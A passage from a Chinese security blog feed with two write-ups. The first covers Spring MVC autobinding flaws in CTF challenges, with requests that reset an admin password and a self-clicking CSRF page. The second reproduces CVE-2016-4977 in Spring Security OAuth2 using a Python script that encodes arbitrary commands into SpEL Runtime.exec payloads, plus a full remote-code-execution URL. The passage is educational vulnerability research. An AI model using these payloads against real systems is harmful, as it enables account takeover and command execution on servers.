class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAttributeController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"addSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/update"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"updateSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/delete"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"deleteSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述ModelAttributeController类中的add、update、delete请求处理方法执行时，首先执行父类BaseController中的isLogin()方法判断登录权限，可以通过地址<code>http://localhost:8080/springMVCDemo02/admin/add</code>测试登录权限。</p><h4 id="SessionAttributes注解"><a href="#SessionAttributes注解" class="headerlink" title="@SessionAttributes注解"></a>@SessionAttributes注解</h4><p>默认情况下Spring MVC将模型中的数据存储到request域中。当一个请求结束后，数据就失效了。如果要跨页面使用。那么需要使用到session。而@SessionAttributes注解就可以使得模型中的数据存储一份到session域中。</p><blockquote><p>Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享。</p></blockquote><h2 id="0x02-案例"><a href="#0x02-案例" class="headerlink" title="0x02 案例"></a>0x02 案例</h2><p>这里参考ZeroNigths HackQuest 2016的两道和自动绑定漏洞相关的Web题，源码下载地址: <a href="https://github.com/3wapp/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">https://github.com/3wapp/ZeroNights-HackQuest-2016</a></p><h3 id="Justice-League"><a href="#Justice-League" class="headerlink" title="Justice League"></a>Justice League</h3><p>将war包放置于Tomcat中跑起来后，看到Justice League页面存在4个功能点：关于、注册、登录、找回密码。</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/8.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>下面先进行代码审计，直接看到注册功能的Controller，ResetPasswordController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(ResetPasswordController.class);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewHandler</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome reset ! "</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetHandler</span><span class="params">(@RequestParam String username, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking username "</span> + username);</span><br><span class="line">User user = userService.findByName(username);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user == <span class="keyword">null</span>) &#123;</span><br><span class="line">logger.info(<span class="string">"there is no user with name "</span> + username);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Username is not found"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"reset"</span>;</span><br><span class="line">&#125;</span><br><span class="line">model.addAttribute(<span class="string">"user"</span>, user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"redirect:resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewQuestionHandler</span><span class="params">(@ModelAttribute User user)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Welcome resetQuestion ! "</span> + user);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/resetQuestion"</span>, method = RequestMethod.POST)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetQuestionHandler</span><span class="params">(@RequestParam String answerReset, SessionStatus status,</span></span></span><br><span class="line"><span class="function"><span class="params">User user, Model model)</span> </span>&#123;</span><br><span class="line">logger.info(<span class="string">"Checking resetQuestion ! "</span> + answerReset + <span class="string">" for "</span> + user);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!user.getAnswer().equals(answerReset)) &#123;</span><br><span class="line">logger.info(<span class="string">"Answer in db "</span> + user.getAnswer() + <span class="string">" Answer "</span> + answerReset);</span><br><span class="line">model.addAttribute(<span class="string">"error"</span>, <span class="string">"Incorrect answer"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"resetQuestion"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">status.setComplete();</span><br><span class="line">String newPassword = GeneratePassword.generatePassowrd(<span class="number">10</span>);</span><br><span class="line">user.setPassword(newPassword);</span><br><span class="line">userService.updateUser(user);</span><br><span class="line"></span><br><span class="line">model.addAttribute(<span class="string">"message"</span>, <span class="string">"Your new password is "</span> + newPassword);</span><br><span class="line"><span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单理下：</p><ol><li>ResetPasswordController类是被<code>@SessionAttributes(&quot;user&quot;)</code>注解修饰的，即会自动把user对象放到session中。</li><li>这里/reset接口就是直接对应的resetHandler()函数。在POST方式的resetHandler()函数中，先判断当前用户名是否存在，若存在则将user添加到model中，再重定向到resetQuestion中作进一步处理；<strong>可以看到，两个resetHandler()函数都没有直接从参数或者从session中获取user对象，因此resetHandler()函数不存在自动绑定漏洞</strong>。</li><li>这里/resetQuestion接口就是直接对应的resetQuestionHandler()函数。在GET方式的resetQuestionHandler()函数中，其唯一的user参数使用了·@ModelAttribute·注解修饰，即会将传递过来的user参数按名称注入到指定对象中，而这里实际上是从session中获取user对象；在POST方式的函数中，并没有使用<code>@ModelAttribute</code>注解修饰参数，但是Spring MVC会自动从session中提取user，并且使用相同的逻辑，用http请求参数去自动绑定对应的用户参数，该函数的代码逻辑，先获取user对象的answer属性值来跟我们从外部表单输入的answerReset值进行比较，若相等则往下成功重置用户密码，否则报错；<strong>也就是说，这两个resetQuestionHandler()函数都用到了session中的user对象，都存在自动绑定漏洞</strong>。</li></ol><p>由前面分析可知，resetQuestionHandler()函数就是自动绑定漏洞的逻辑漏洞代码所在，我们只需要对这个接口的以GET或POST方式传递User类对象的参数即可修改自动绑定的user对象的属性值，实现自动绑定漏洞的利用。</p><h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>我们先点击忘记密码，在这里输入admin用户名检测是否存在该用户：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/9.png" alt=""></p><p>若存在则直接跳转到/resetQuestion界面，这里是个密保找回的表单：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/5.png" alt=""></p><p>现在已知是存在admin用户的，下面就对admin用户进行自动绑定漏洞的攻击利用。</p><h5 id="攻击GET方式的-resetQuestion接口"><a href="#攻击GET方式的-resetQuestion接口" class="headerlink" title="攻击GET方式的/resetQuestion接口"></a>攻击GET方式的/resetQuestion接口</h5><p>直接往/resetQuestion接口发送包含user对象属性的参数即可直接篡改user对象的属性值：</p><p><code>GET /justiceleague/resetQuestion?answer=mi1k7ea</code></p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/1.png" alt=""></p><p>在Tomcat后台是可以看到日志记录了将admin用户的answer属性篡改了：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/2.png" alt=""></p><p>当然，user对象的其他参数也是可以直接通过变量绑定漏洞直接修改的，比如直接修改admin用户的密码：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/3.png" alt=""></p><h5 id="攻击POST方式的-resetQuestion接口"><a href="#攻击POST方式的-resetQuestion接口" class="headerlink" title="攻击POST方式的/resetQuestion接口"></a>攻击POST方式的/resetQuestion接口</h5><p>提交POST表单的页面就是前面/resetQuestion的界面，我们知道该表单包含两个参数即question和answerReset。</p><p>我们这里在原报文的基础上，直接添加user对象的属性为参数来篡改user属性值：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/4.png" alt=""></p><p>可以看到，虽然我们不知道真正的密保答案即admin用户的answer属性值，因此输入错误的answerReset参数值后就会显示回答错误，但是我们却成功篡改了admin的password，其他属性也是一样的操作即可。</p><p>除了这种利用方式外，POST方式的resetQuestionHandler()函数中还存在逻辑漏洞，即找回密码过程中进行密保问题回答的处理过程存在自动绑定漏洞绕过的风险。现在，我们只需要在原本POST报文的基础上加上answer参数、使其值直接和answerReset参数的一致，由于自动绑定漏洞的存在，将导致后台程序在比较user对象的answer属性值和我们表单提交的answerReset参数值是否相等时直接绕过了，从而执行了后面的代码实现密码重置：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/6.png" alt=""></p><p>此时到Tomcat后台查看，admin用户的answer被篡改为test，password被成功重置了和页面返回的一样：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/7.png" alt=""></p><h3 id="Edik"><a href="#Edik" class="headerlink" title="Edik"></a>Edik</h3><p>将war包放置于Tomcat中跑起来后，看到Edik主要有主页、注册、登录等几个页面。</p><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>打开源码Controller部分，发现只有HomeController和RegistrationController这两个Controller文件。而其中使用<code>@ModelAttribute</code>或<code>@SessionAttributes</code>注解的只有HomeController这个文件，也就是说，有且仅有HomeController中会存在自动绑定漏洞。</p><p>我们看到HomeController的源码，这里只看有相关注解的部分即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HomeController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"secondSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getSecretCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(secondSecret);</span><br><span class="line"><span class="keyword">return</span> secondSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@ModelAttribute</span>(<span class="string">"showSecret"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Boolean <span class="title">getShowSectet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">logger.debug(<span class="string">"flag: "</span> + showSecret);</span><br><span class="line"><span class="keyword">return</span> showSecret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/home"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">home</span><span class="params">(@ModelAttribute User user, Model model)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (showSecret)&#123;</span><br><span class="line">model.addAttribute(<span class="string">"firstSecret"</span>, firstSecret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析可知：</p><ol><li>HomeController使用<code>@SessionAttributes</code>注解修饰user对象，说明user对象会保存到session中；</li><li>使用<code>@ModelAttribute</code>注解的地方总共有3处，前两处是修饰方法，使方法在每次调用该控制器类的请求处理方法前被调用，主要用于日志记录；第三处是修饰的/home接口对应的home()函数的user参数，该接口是GET方式访问的；</li></ol><p>由此可知，HomeController的home()函数处是存在自动绑定漏洞的，因为通过注解和自动绑定机制我们可以直接通过参数的形式给home()函数的user对象传递恶意的属性值，而最后返回”home”会跳转到home界面进行展示。</p><h4 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>这个站点本身没有更多的业务功能能让我们进行更深的利用。</p><h5 id="常规利用"><a href="#常规利用" class="headerlink" title="常规利用"></a>常规利用</h5><p>先注册个用户，然后登录，看到是跳转到了/home路径，这里页面展示了当前用户名和体重信息：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/10.png" alt=""></p><p>这里直接对/home接口以GET方式传递user对象的属性值，比如直接篡改用户名：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/11.png" alt=""></p><p>User类对象的另外两个属性password和weight也是同样能被修改的。</p><h5 id="自动绑定漏洞-XSS组合拳"><a href="#自动绑定漏洞-XSS组合拳" class="headerlink" title="自动绑定漏洞+XSS组合拳"></a>自动绑定漏洞+XSS组合拳</h5><p>这里很鸡肋：</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/12.png" alt=""></p><h5 id="自动绑定漏洞-CSRF组合拳"><a href="#自动绑定漏洞-CSRF组合拳" class="headerlink" title="自动绑定漏洞+CSRF组合拳"></a>自动绑定漏洞+CSRF组合拳</h5><p>此外，自动绑定漏洞能和CSRF组合利用。</p><p>比如将修改password的自动绑定漏洞的链接和CSRF组合，通过诱使受害者访问即可成功修改受害者的密码，恶意csrf.html如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'http://192.168.10.1:8080/edik/home?password=666'</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> m = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'a'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">  m.click();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-防御方法"><a href="#0x03-防御方法" class="headerlink" title="0x03 防御方法"></a>0x03 防御方法</h2><p>Spring MVC中可以使用@InitBinder注解，通过WebDataBinder的方法setAllowedFields、setDisallowedFields设置允许或不允许绑定的参数。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://xz.aliyun.com/t/128" target="_blank" rel="noopener">浅析自动绑定漏洞</a></p><p><a href="https://xz.aliyun.com/t/1089" target="_blank" rel="noopener">Spring MVC Autobinding漏洞实例初窥</a></p><p><a href="https://www.anquanke.com/post/id/86278" target="_blank" rel="noopener">【技术分享】自动绑定漏洞和Spring MVC</a></p><p><a href="http://www.beesfun.com/2017/07/22/Spring-MVC-自动绑定漏洞/" target="_blank" rel="noopener">Spring MVC 自动绑定漏洞</a></p><p><a href="http://c.biancheng.net/view/4412.html" target="_blank" rel="noopener">Spring MVC中@ModelAttribute注解的使用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/categories/Java/Spring/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>浅析Spring Security OAuth2之CVE-2016-4977</title>
    <link href="https://www.mi1k7ea.com/2020/02/09/%E6%B5%85%E6%9E%90Spring-Security-OAuth2%E4%B9%8BCVE-2016-4977/"/>
    <id>https://www.mi1k7ea.com/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/</id>
    <published>2020-02-09T14:22:22.000Z</published>
    <updated>2020-02-11T14:33:06.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-Security-OAuth2"><a href="#0x01-Spring-Security-OAuth2" class="headerlink" title="0x01 Spring Security OAuth2"></a>0x01 Spring Security OAuth2</h2><h3 id="OAuth2"><a href="#OAuth2" class="headerlink" title="OAuth2"></a>OAuth2</h3><p>OAuth 2.0是用于授权的行业标准协议，核心思路是通过各类认证手段（具体什么手段OAuth 2.0不关心）认证用户身份，并颁发token，使得第三方应用可以使用该token在限定时间、限定范围内访问指定资源。OAuth 2.0致力于简化客户端开发人员的工作，同时为Web应用程序、桌面应用程序、移动电话和客厅设备提供特定的授权流程。</p><p>OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。</p><p>“客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p><p>校验流程如图：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/4.png" alt=""></p><p>具体的讲解可参考：<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">《理解OAuth 2.0》</a></p><h3 id="Spring-Security-OAuth2"><a href="#Spring-Security-OAuth2" class="headerlink" title="Spring Security OAuth2"></a>Spring Security OAuth2</h3><p>Spring Security OAuth2是为Spring框架提供安全认证支持的一个模块，主要包含认证服务器和资源服务器这两大块的实现：</p><p>Spring Security OAuth2主要包含认证服务器和资源服务器这两大块的实现：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/5.png" alt=""></p><p>认证服务器主要包含了四种授权模式的实现和Token的生成与存储，我们也可以在认证服务器中自定义获取Token的方式；资源服务器主要是在Spring Security的过滤器链上加了OAuth2AuthenticationProcessingFilter过滤器，即使用OAuth2协议发放令牌认证的方式来保护我们的资源。</p><p>更多的参考官方文档即可。</p><h2 id="0x02-CVE-2016-4977"><a href="#0x02-CVE-2016-4977" class="headerlink" title="0x02 CVE-2016-4977"></a>0x02 CVE-2016-4977</h2><p>在Spring Security OAuth2的漏洞版本中，当用户使用<code>whitelabel views</code>来处理错误时，由于使用了SpEL表达式，攻击者在被授权的情况下可以通过构造恶意参数来RCE。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul><li>2.0.0 to 2.0.9</li><li>1.0.0 to 1.0.5</li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考Vulhub：<a href="https://vulhub.org/#/environments/spring/CVE-2016-4977/" target="_blank" rel="noopener">https://vulhub.org/#/environments/spring/CVE-2016-4977/</a></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问如下链接，使用admin:admin登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;123*456&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br><span class="line">或</span><br><span class="line">http://your-ip:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;123*456&#125;</span><br></pre></td></tr></table></figure><p>在页面响应中会发现URL其中的参数的SpEL表达式会被解析，前面两个不同参数的注入在页面显示的报错信息也不一样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">error=&quot;unsupported_response_type&quot;, error_description=&quot;Unsupported response types: [56088]&quot;</span><br><span class="line">或</span><br><span class="line">error=&quot;invalid_grant&quot;, error_description=&quot;Invalid redirect: 56088 does not match one of the registered values: [http://localhost]&quot;</span><br></pre></td></tr></table></figure><p>此时已证明是存在SpEL表达式注入漏洞了。下面就进行漏洞利用。</p><p>注意，如果直接将对应的参数改为恶意的SpEL表达式来尝试执行某些命令的话会发现大多数不能成功，原因可参考：<a href="https://x.hacking8.com/post-294.html" target="_blank" rel="noopener">Java Runtime.getRuntime().exec() 的那些payloads</a></p><p>这里直接用P神的脚本，原理是会用ord()函数将命令中的每个字符转换为ASCII码，再通过字符串拼接以及调用toString()函数来实现命令还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">message = input(<span class="string">'Enter message to encode:'</span>)</span><br><span class="line"></span><br><span class="line">poc = <span class="string">'$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)'</span> % ord(message[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> message[<span class="number">1</span>:]:</span><br><span class="line">   poc += <span class="string">'.concat(T(java.lang.Character).toString(%s))'</span> % ord(ch) </span><br><span class="line"></span><br><span class="line">poc += <span class="string">')&#125;'</span></span><br><span class="line"></span><br><span class="line">print(poc)</span><br></pre></td></tr></table></figure><p>这里输入<code>touch /tmp/mi1k7ea</code>，生成如下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;</span><br></pre></td></tr></table></figure><p>最后将该内容替换到前面URL的会被SpEL解析的参数中构造出最终的PoC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/oauth/authorize?response_type=$&#123;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(116).concat(T(java.lang.Character).toString(111)).concat(T(java.lang.Character).toString(117)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(104)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(109)).concat(T(java.lang.Character).toString(105)).concat(T(java.lang.Character).toString(49)).concat(T(java.lang.Character).toString(107)).concat(T(java.lang.Character).toString(55)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(97)))&#125;&amp;client_id=acme&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p>访问后页面显示如下：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/1.png" alt=""></p><p>到后台发现命令成功执行：</p><p><img src="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/2.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里就不逐步调试分析了，直接看到关键的几个函数。</p><p>这里我们选择2.0.9版本的Spring Security Oauth的代码来分析。</p><p>由前面页面的显示知道，在Spring Security Oauth2中是使用了<code>whitelabel views</code>来处理错误的，而漏洞点正是出在这个错误的处理过程中。</p><p>接着我们找到对应的错误处理的源码路径：<a href="https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java" target="_blank" rel="noopener">https://github.com/spring-projects/spring-security-oauth/blob/2.0.9.RELEASE/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java</a></p><p>看到WhitelabelErrorEndpoint类中，其含有一个handlerError()函数用于处理错误，这里会获取请求中的error，将其转换为OAuth2Exception类型，然后调用getSummary()函数来获取错误信息并进行HTML编码后赋值给errorSummary变量，将该变量put进model中，最后用SpelView()来渲染：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Controller for displaying the error page for the authorization server.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Dave Syer</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 